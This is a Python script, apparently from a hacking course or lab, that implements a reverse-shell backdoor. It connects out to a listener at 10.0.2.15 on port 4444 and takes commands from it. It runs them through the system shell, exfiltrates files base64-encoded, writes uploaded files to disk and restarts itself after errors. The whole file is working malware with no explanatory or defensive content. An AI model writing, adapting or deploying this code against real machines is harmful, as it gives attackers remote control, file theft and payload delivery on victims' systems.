#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip="10.0.2.15", port=4444):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    @staticmethod
    def execute_system_command(command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            return e.output

    def reliable_send(self, data):
        json_data = json.dumps(data.decode("utf-8"))
        self.connection.send(bytes(json_data, "utf-8"))

    def reliable_receive(self):
        json_data = bytes("", "utf-8")
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def cd(path):
        os.chdir(path)
        return bytes("WD -> " + path, "utf-8")

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "Upload Successful."

    @staticmethod
    def read_file(path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        # noinspection PyBroadException
        try:
            while True:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.cd(command[1])
                    self.reliable_send(command_result)
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    self.reliable_send(command_result)
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                    self.reliable_send(bytes(command_result, "utf-8"))
                else:
                    command_result = self.execute_system_command(command)
                    self.reliable_send(command_result)
        except Exception as e:
            self.reliable_send(bytes(str(e), "utf-8"))
            self.run()


my_backdoor = Backdoor()
my_backdoor.run()
